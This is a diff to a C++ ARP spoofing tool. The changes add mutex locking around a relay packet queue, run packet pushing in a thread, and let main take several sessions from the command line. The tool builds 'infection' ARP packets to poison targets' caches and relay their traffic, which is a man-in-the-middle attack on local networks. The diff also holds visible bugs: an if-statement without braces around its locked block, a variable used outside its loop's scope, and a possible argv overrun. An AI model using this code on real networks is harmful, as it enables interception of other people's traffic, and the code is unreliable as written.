@@ -24,14 +24,18 @@ void ArpSpoofer::push_relay_packet()
             {
             case (uint16_t)Ethernet::EtherType::ARP :{
                 if ( my_eth.dst_mac().mac() == s.target_mac->mac() ) 
+                    mtx.lock();
                     relay_qeue.push( make_infection(s).serialize() );                
+                    mtx.unlock();
                 break;
             }
             case (uint16_t)Ethernet::EtherType::IP :{
                 if ( my_ip.dest_ip().ip() == s.target_ip->ip() )  {                    
+                    mtx.lock();
                     relay_qeue.push( 
                         Ethernet(iface.mac(), *s.target_mac,Ethernet::EtherType::IP).serialize()
-                    );                
+                    );
+                    mtx.unlock();       
                 }
                 break;
             }
@@ -44,13 +48,19 @@ void ArpSpoofer::push_relay_packet()
 
 void ArpSpoofer::run()
 {
-    vector<session> ifv;    
+    vector<session> ifv;
     for (auto sess : sessions)
-        ifv.push_back(make_infection(sess));        
-    
-    while(not relay_qeue.empty()) {
+        ifv.push_back(make_infection(sess));
+
+    std::thread t1{ &ArpSpoofer::push_relay_packet, this };
+    t1.join();
+
+    while (not relay_qeue.empty()) {
         arp_sender.send_packet(relay_qeue.front());
+
+        mtx.lock();
         relay_qeue.pop();
+        mtx.unlock();
     }
 
     while (true) {
@@ -61,6 +71,9 @@ void ArpSpoofer::run()
 }
 
 int main(int argc, char* argv[]) {
-    auto ss = session(string(argv[2]), string(argv[3]),string(argv[1]));
-    auto ar = ArpSpoofer(string("wlp2s0"), ss);    
+    for(int i = 2; i < argc; i++) {
+        auto ss = session(string(argv[i]),string(argv[i+1]));
+    }
+    
+    auto ar = ArpSpoofer(string(argv[1]), ss);    
 }
